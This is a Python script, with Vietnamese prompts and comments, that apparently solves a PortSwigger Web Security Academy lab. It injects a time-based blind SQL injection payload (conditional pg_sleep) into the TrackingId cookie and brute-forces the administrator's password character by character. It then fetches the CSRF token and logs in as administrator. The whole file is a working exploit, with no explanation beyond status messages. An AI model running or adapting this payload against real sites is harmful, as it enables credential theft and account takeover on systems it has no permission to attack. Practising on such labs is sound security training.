import requests
import time
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

session = requests.Session()
res = session.get(base_url)

tracking_id = res.cookies.get("TrackingId")
session_id = res.cookies.get("session")

charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[!] Bắt đầu dò password...")

for i in range(1, 21):
    for char in charset:
        payload = f"{tracking_id}'|| (SELECT CASE WHEN SUBSTRING(password,{i},1)='{char}' THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')--"
        cookies = {
            "TrackingId": payload,
            "session": session_id
        }

        start = time.time()
        res_test = session.get(base_url, cookies=cookies)
        end = time.time()

        if end - start > 5:
            password += char
            print(f"[+] Tìm thấy ký tự thứ {i}")
            break
    else:
        print(f"[-] Không tìm được ký tự ở vị trí {i}")
        break

print(f"\n[+] Mật khẩu administrator: {password}")
print(f"[!] Bắt đầu đăng nhập...")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")